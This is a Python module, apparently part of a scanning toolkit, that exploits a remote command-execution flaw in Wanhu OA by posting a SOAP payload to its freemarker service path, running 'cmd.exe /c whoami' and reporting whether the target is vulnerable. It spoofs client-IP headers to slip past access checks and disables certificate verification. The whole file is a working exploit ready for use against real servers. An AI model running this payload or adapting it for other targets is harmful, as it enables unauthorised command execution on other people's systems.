import requests
import time
from bs4 import BeautifulSoup
import logging
from urllib.parse import urljoin

cdd=''
http = ''
https = ''
def dl7(dl):
    global http,https
    http=dl
    https=dl
def a(url1,s_cookie):
    global cdd
    global http, https
    try:
        proxies = {'http': http,
                   'https': https}
        path = "defaultroot/services/./././freemarkeService"
        data = """
        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:util="http://utility.template.freemarker" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
        <soapenv:Header/>
        <soapenv:Body>
        <util:exec soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
        <arguments xsi:type="xst:ArrayOf_xsd_anyType" soapenc:arrayType="xsd:anyType[]">
        <cmd xsi:type="soapenc:string">
        c:\windows\system32\cmd.exe /c whoami</cmd>
        </arguments>
        </util:exec>
        </soapenv:Body>
        </soapenv:Envelope>
                """
        headers = {"X-Forwarded-For": "127.0.0.1",
                   "X-Originating": "127.0.0.1",
                   "X-Remote-IP": "127.0.0.1",
                   "X-Remote-Addr": "127.0.0.1",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
                   }
        logging.captureWarnings(True)
        aa1 = requests.get(url1 + path, cookies=s_cookie,data=data,headers=headers,proxies=proxies,allow_redirects = False,verify=False, timeout=8)
        if aa1.status_code==200 and '<?xml version="1.0"' in  aa1.text and "命令" in aa1.text:
            cdd='[+]漏洞存在\n'+str(aa1.text)
        else:
            cdd='[-]漏洞不存在\n'
    except Exception as aaa:
        cdd='请求错误\n'+str(aaa)
def jga2():
    global cdd
    return '--------------------------------------------------\n[ 万户 命令执行 ]\n\n'+ str(cdd)
def ua2(aoca,pd,s_cookie):
    global http,https
    url1 = aoca
    if pd=='0':
        http = None
        https = None
        a(url1,s_cookie)
    elif pd=='1':
        a(url1,s_cookie)